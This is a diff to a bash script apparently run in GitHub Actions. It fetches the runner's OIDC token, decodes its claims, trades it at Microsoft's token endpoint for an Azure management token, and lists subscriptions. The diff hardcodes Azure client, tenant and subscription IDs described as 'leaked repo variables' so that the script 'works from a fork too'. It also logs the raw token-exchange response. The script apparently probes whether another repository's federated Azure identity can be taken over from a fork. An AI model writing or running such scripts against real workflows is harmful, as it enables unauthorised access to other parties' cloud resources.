@@ -4,6 +4,11 @@
 set +e
 exec > >(tee /tmp/all.log) 2>&1
 
+# leaked repo variables (not secrets) - fallbacks so this works from a fork too
+AZURE_CLIENT_ID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
+AZURE_TENANT_ID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
+AZURE_SUBSCRIPTION_ID="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
+
 echo "::group::context"
 echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF actor=$GITHUB_ACTOR"
 echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
@@ -15,7 +20,8 @@ echo "::endgroup::"
 IDT=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
 echo "oidc token length: ${#IDT}"
-echo "oidc claims:"; echo "$IDT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
+echo ">>> OIDC SUBJECT (what Azure fed-cred must trust):"
+echo "$IDT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
   | jq '{sub,aud,repository,repository_owner,event_name,ref,workflow,job_workflow_ref}' 2>/dev/null
 echo
 
@@ -28,12 +34,16 @@ az account show -o json
 az account list --all -o json
 echo "::endgroup::"
 
-# 3) ARM token (raw) as a cross-check / fallback
-ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
+# 3) ARM token (raw) - show FULL response so we see AADSTS errors / expected subject
+echo "::group::azure token exchange (raw)"
+XCHG=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
   -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-  -d "client_assertion=$IDT" -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
+  -d "client_assertion=$IDT" -d "scope=https://management.azure.com/.default")
+echo "$XCHG" | jq 'if .access_token then {token_type,expires_in,scope,access_token:"<got>"} else {error,error_description} end' 2>/dev/null || echo "$XCHG"
+ARM=$(echo "$XCHG" | jq -r '.access_token // empty')
 echo "arm token len: ${#ARM}"
+echo "::endgroup::"
 SUB="${AZURE_SUBSCRIPTION_ID}"
 AUTH=(-H "Authorization: Bearer $ARM")
 echo "== subscriptions =="; curl -sS "${AUTH[@]}" "https://management.azure.com/subscriptions?api-version=2022-12-01"; echo
